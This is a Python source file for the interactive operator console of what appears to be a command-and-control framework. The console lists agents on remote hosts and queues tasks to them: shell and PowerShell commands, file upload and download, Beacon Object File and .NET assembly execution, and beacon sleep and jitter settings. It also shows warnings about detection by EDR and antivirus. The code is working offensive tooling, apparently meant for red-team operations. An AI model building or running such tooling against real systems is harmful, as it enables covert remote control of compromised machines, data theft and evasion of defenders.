"""
Interactive operator shell built on prompt_toolkit.

State machine with two contexts:
  - main: global commands (agents, listeners, modules, interact)
  - agent: agent-specific commands + module execution
"""

import asyncio
import logging
import shlex
from pathlib import Path
from typing import Optional

from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import FormattedText
from prompt_toolkit.history import FileHistory
from prompt_toolkit.patch_stdout import patch_stdout
from rich.console import Console
from rich.panel import Panel

from .completer import ShellCompleter
from .themes import BANNER
from .commands.agents import cmd_agents
from .commands.listeners import cmd_listeners_list
from .commands.modules import cmd_modules_list, cmd_modules_search, cmd_module_help
from .commands.help import cmd_help
from .commands.generate import cmd_generate

from ..core.session_manager import SessionManager, AgentSession
from ..core.task_manager import TaskManager
from ..core.module_registry import (
    ModuleRegistry, ModuleNotFoundError, IncompatibleError,
    ArgumentError, UserCancelled,
)
from ..core.events import event_bus, EventBus
from ..formatters.table import OutputParser, render_table, console as fmt_console
from ..listeners.base import BaseListener
from ..logging.operator_logger import OperatorLogger
from ..protocol.commands import TaskType

log = logging.getLogger(__name__)
console = Console()


class OperatorShell:
    """
    Interactive prompt_toolkit shell for the operator client.
    """

    def __init__(
        self,
        session_manager: SessionManager,
        task_manager: TaskManager,
        module_registry: ModuleRegistry,
        logger: OperatorLogger,
        history_file: Path = Path("./logs/.shell_history"),
    ):
        self.session_manager = session_manager
        self.task_manager = task_manager
        self.module_registry = module_registry
        self.logger = logger
        self.output_parser = OutputParser()

        self._context = "main"
        self._current_agent: Optional[AgentSession] = None
        self._listeners: dict[int, BaseListener] = {}
        self._running = True

        self._completer = ShellCompleter(module_registry, session_manager)

        history_file.parent.mkdir(parents=True, exist_ok=True)
        self._session = PromptSession(
            history=FileHistory(str(history_file)),
            completer=self._completer,
            complete_while_typing=True,
        )

        # Register event handlers
        event_bus.on(EventBus.AGENT_CHECKIN, self._on_agent_checkin)
        event_bus.on(EventBus.TASK_RESULT, self._on_task_result)

    def register_listener(self, listener: BaseListener):
        self._listeners[listener.listener_id] = listener

    def _get_prompt(self) -> FormattedText:
        if self._context == "main":
            return FormattedText([("class:prompt", "main> ")])

        agent = self._current_agent
        if not agent:
            return FormattedText([("class:prompt", "main> ")])

        return FormattedText([
            ("class:agent-id", f"[agent {agent.display_id}]"),
            ("class:hostname", f"[{agent.hostname}]"),
            ("class:username", f"[{agent.username}]"),
            ("class:integrity", f"[{agent.integrity}]"),
            ("class:arch", f"[{agent.arch}]"),
            ("class:pid", f"[PID:{agent.pid}]"),
            ("class:path", f" {agent.cwd}"),
            ("class:prompt-end", "> "),
        ])

    async def run(self):
        """Main shell loop."""
        console.print(BANNER, style="bold cyan")
        console.print(
            f"[*] Loaded {len(self.module_registry.modules)} modules",
            style="green",
        )
        for lid, listener in self._listeners.items():
            info = listener.info()
            console.print(
                f"[*] Listener {info['type']} on "
                f"{info.get('interface', '')}:{info.get('port', '')} "
                f"[{info['status']}]",
                style="green",
            )
        console.print()

        while self._running:
            try:
                with patch_stdout():
                    text = await self._session.prompt_async(
                        self._get_prompt(),
                    )

                text = text.strip()
                if not text:
                    continue

                if self._context == "main":
                    await self._handle_main(text)
                elif self._context == "agent":
                    await self._handle_agent(text)

            except KeyboardInterrupt:
                continue
            except EOFError:
                self._running = False
                break
            except Exception as e:
                console.print(f"[bold red]Error:[/] {e}")
                log.error(f"Shell error: {e}", exc_info=True)

        console.print("[*] Shutting down...", style="yellow")

    async def _handle_main(self, text: str):
        """Handle commands in main context."""
        parts = shlex.split(text)
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd == "help":
            cmd_help("main")

        elif cmd == "agents":
            cmd_agents(self.session_manager)

        elif cmd == "interact":
            if not args:
                console.print("[red]Usage: interact <agent_id>[/red]")
                return
            try:
                display_id = int(args[0])
            except ValueError:
                console.print("[red]Agent ID must be a number.[/red]")
                return
            agent = self.session_manager.get_by_display_id(display_id)
            if not agent:
                console.print(f"[red]No agent with ID {display_id}.[/red]")
                return
            self._current_agent = agent
            self._context = "agent"
            self._completer.context = "agent"
            console.print(
                f"[green][*] Interacting with agent {display_id} "
                f"({agent.hostname})[/green]"
            )

        elif cmd == "listeners":
            if not args or args[0] == "list":
                cmd_listeners_list(self._listeners)
            elif args[0] == "start":
                console.print("[dim]Listener start requires configuration.[/dim]")
            elif args[0] in ("stop", "kill"):
                if len(args) < 2:
                    console.print("[red]Usage: listeners stop <id>[/red]")
                    return
                try:
                    lid = int(args[1])
                except ValueError:
                    console.print("[red]Listener ID must be a number.[/red]")
                    return
                listener = self._listeners.get(lid)
                if listener:
                    await listener.stop()
                    console.print(f"[yellow]Listener {lid} stopped.[/yellow]")
                else:
                    console.print(f"[red]No listener with ID {lid}.[/red]")
            else:
                console.print(f"[red]Unknown listeners subcommand: {args[0]}[/red]")

        elif cmd == "modules":
            if not args or args[0] == "list":
                cmd_modules_list(self.module_registry)
            elif args[0] == "search" and len(args) > 1:
                cmd_modules_search(self.module_registry, " ".join(args[1:]))
            else:
                console.print("[red]Usage: modules [list|search <query>][/red]")

        elif cmd == "generate":
            args_str = " ".join(args) if args else ""
            project_root = Path(__file__).parent.parent.parent
            cmd_generate(args_str, project_root, list(self._listeners.values()))

        elif cmd == "exit":
            self._running = False

        else:
            console.print(f"[red]Unknown command: {cmd}. Type 'help' for commands.[/red]")

    async def _handle_agent(self, text: str):
        """Handle commands in agent context."""
        parts = shlex.split(text)
        cmd = parts[0].lower()
        args = parts[1:]
        agent = self._current_agent

        if cmd == "back":
            self._current_agent = None
            self._context = "main"
            self._completer.context = "main"
            return

        if cmd == "help":
            if args:
                mod = self.module_registry.get(args[0])
                if mod:
                    cmd_module_help(mod)
                else:
                    console.print(f"[red]Unknown module: {args[0]}[/red]")
            else:
                cmd_help("agent")
            return

        if cmd == "info":
            self._show_agent_info(agent)
            return

        if cmd == "modules":
            if not args or args[0] == "list":
                cmd_modules_list(self.module_registry)
            elif args[0] == "search" and len(args) > 1:
                cmd_modules_search(self.module_registry, " ".join(args[1:]))
            return

        if cmd == "sleep":
            if not args:
                console.print("[red]Usage: sleep <seconds> [jitter%][/red]")
                return
            try:
                interval = int(args[0])
                jitter = int(args[1].rstrip("%")) if len(args) > 1 else agent.jitter_percent
            except ValueError:
                console.print("[red]Invalid sleep/jitter value.[/red]")
                return
            agent.sleep_interval = interval
            agent.jitter_percent = jitter
            self.task_manager.create_task(
                agent, TaskType.CONFIG, "sleep",
                arguments=f"{interval}:{jitter}".encode(),
            )
            console.print(f"[green]Sleep set to {interval}s (jitter {jitter}%)[/green]")
            return

        if cmd == "clear":
            count = self.task_manager.clear_pending(agent)
            console.print(f"[yellow]Cleared {count} pending tasks.[/yellow]")
            return

        if cmd == "exit":
            console.print("[bold red]Kill agent process? (y/N)[/bold red]")
            confirm = await self._session.prompt_async(
                FormattedText([("", "confirm> ")]),
            )
            if confirm.strip().lower() in ("y", "yes"):
                self.task_manager.create_task(agent, TaskType.EXIT, "exit")
                console.print("[red]Exit task queued.[/red]")
                self._current_agent = None
                self._context = "main"
                self._completer.context = "main"
            return

        if cmd in ("shell", "powershell"):
            console.print(
                f"[bold red]WARNING: '{cmd}' spawns a child process. "
                f"Detectable by EDR/AV. Continue? (y/N)[/bold red]"
            )
            confirm = await self._session.prompt_async(
                FormattedText([("", "confirm> ")]),
            )
            if confirm.strip().lower() not in ("y", "yes"):
                return
            shell_cmd = " ".join(args)
            self.task_manager.create_task(
                agent, TaskType.NATIVE, cmd,
                arguments=shell_cmd.encode(),
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                cmd, {"command": shell_cmd},
            )
            console.print(f"[yellow]Task queued: {cmd} {shell_cmd}[/yellow]")
            return

        if cmd == "upload":
            if len(args) < 2:
                console.print("[red]Usage: upload <local> <remote>[/red]")
                return
            local_path = Path(args[0])
            if not local_path.exists():
                console.print(f"[red]Local file not found: {local_path}[/red]")
                return
            payload = local_path.read_bytes()
            remote_path = args[1]
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "upload",
                payload=payload,
                arguments=remote_path.encode(),
            )
            size = len(payload)
            console.print(f"[green]Upload queued: {local_path.name} ({size}B) -> {remote_path}[/green]")
            return

        if cmd == "download":
            if not args:
                console.print("[red]Usage: download <remote> [local][/red]")
                return
            remote_path = args[0]
            self.task_manager.create_task(
                agent, TaskType.NATIVE, "download",
                arguments=remote_path.encode(),
            )
            console.print(f"[green]Download queued: {remote_path}[/green]")
            return

        if cmd == "bof":
            if not args:
                console.print("[red]Usage: bof <path.o> [args...][/red]")
                return
            bof_path = Path(args[0])
            if not bof_path.exists():
                console.print(f"[red]BOF file not found: {bof_path}[/red]")
                return
            payload = bof_path.read_bytes()
            bof_args = " ".join(args[1:]) if len(args) > 1 else ""
            self.task_manager.create_task(
                agent, TaskType.BOF, bof_path.stem,
                payload=payload,
                arguments=bof_args.encode() if bof_args else b"",
            )
            console.print(f"[green]BOF queued: {bof_path.name} ({len(payload)}B)[/green]")
            return

        if cmd == "assembly":
            if not args:
                console.print("[red]Usage: assembly <path.exe> [args...][/red]")
                return
            asm_path = Path(args[0])
            if not asm_path.exists():
                console.print(f"[red]Assembly not found: {asm_path}[/red]")
                return
            payload = asm_path.read_bytes()
            asm_args = " ".join(args[1:]) if len(args) > 1 else ""
            self.task_manager.create_task(
                agent, TaskType.ASSEMBLY, asm_path.stem,
                payload=payload,
                arguments=asm_args.encode() if asm_args else b"",
            )
            console.print(f"[green]Assembly queued: {asm_path.name} ({len(payload)}B)[/green]")
            return

        # Try as a module name
        mod = self.module_registry.get(cmd)
        if mod:
            self._execute_module(agent, cmd, args)
            return

        console.print(f"[red]Unknown command or module: {cmd}[/red]")

    def _execute_module(self, agent, module_name, raw_args):
        """Parse module arguments and dispatch."""
        parsed_args = {}
        i = 0
        while i < len(raw_args):
            if raw_args[i].startswith("--"):
                key = raw_args[i][2:]
                if i + 1 < len(raw_args) and not raw_args[i + 1].startswith("--"):
                    parsed_args[key] = raw_args[i + 1]
                    i += 2
                else:
                    parsed_args[key] = "true"
                    i += 1
            else:
                i += 1

        def confirm_opsec(name, notes):
            console.print(f"[bold red]OPSEC WARNING:[/bold red] {name} is HIGH risk.\n  {notes}")
            resp = input("Continue? (y/N) ")
            return resp.strip().lower() in ("y", "yes")

        try:
            task = self.module_registry.dispatch(
                agent, module_name, parsed_args,
                confirm_opsec=confirm_opsec,
            )
            self.logger.log_command(
                agent.agent_id, agent.hostname, agent.username,
                module_name, parsed_args,
            )
            console.print(f"[green]Task queued: {module_name} (id: {task.task_id[:8]})[/green]")
        except ModuleNotFoundError as e:
            console.print(f"[red]{e}[/red]")
        except IncompatibleError as e:
            console.print(f"[red]Compatibility error: {e}[/red]")
        except ArgumentError as e:
            console.print(f"[red]{e}[/red]")
        except UserCancelled:
            console.print("[yellow]Cancelled.[/yellow]")

    def _show_agent_info(self, agent):
        """Display detailed agent info."""
        info_lines = [
            f"Agent ID:      {agent.agent_id}",
            f"Display ID:    {agent.display_id}",
            f"Hostname:      {agent.hostname}",
            f"Username:      {agent.username}",
            f"PID:           {agent.pid}",
            f"PPID:          {agent.ppid}",
            f"Process:       {agent.process_name}",
            f"Architecture:  {agent.arch}",
            f"OS:            {agent.os_version}",
            f".NET Version:  {agent.dotnet_version}",
            f"Integrity:     {agent.integrity}",
            f"Is Admin:      {agent.is_admin}",
            f"C2 Channel:    {agent.c2_channel}",
            f"Sleep:         {agent.sleep_interval}s (jitter {agent.jitter_percent}%)",
            f"CWD:           {agent.cwd}",
            f"Agent Version: {agent.agent_version}",
            f"First Seen:    {agent.first_seen.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Last Seen:     {agent.last_seen.strftime('%Y-%m-%d %H:%M:%S')} ({agent.last_seen_ago} ago)",
            f"Pending Tasks: {len(agent.pending_tasks)}",
            f"Active Tasks:  {len(agent.active_tasks)}",
            f"Completed:     {len(agent.completed_tasks)}",
        ]
        console.print(Panel("\n".join(info_lines), title="Agent Info", border_style="cyan"))

    def _on_agent_checkin(self, session, is_new):
        """Event handler for agent check-ins."""
        if is_new:
            console.print(
                f"\n[bold green][+] New agent:[/] {session.hostname} "
                f"({session.username}) [{session.integrity}] "
                f"[{session.arch}] PID:{session.pid}",
                highlight=False,
            )

    def _on_task_result(self, session, task):
        """Event handler for task results."""
        st = "green" if task.status.name == "COMPLETE" else "red"
        console.print(f"\n[{st}][*] Result from {session.hostname} ({task.module_name}):[/{st}]")
        if not (task.result and task.result.raw):
            return
        mod = self.module_registry.get(task.module_name)
        if mod:
            output = self.output_parser.parse(mod, task.result.raw)
            if output.error:
                console.print(f"[red]Error: {output.error}[/red]")
            elif output.raw_rows:
                render_table(mod.columns, output.raw_rows, title=task.module_name)
            elif output.text:
                console.print(output.text)
            elif output.file_data:
                nbytes = len(output.file_data)
                console.print(f"[green]File data received: {nbytes} bytes[/green]")
        else:
            text = task.result.raw.decode("utf-8", errors="replace")
            console.print(text)
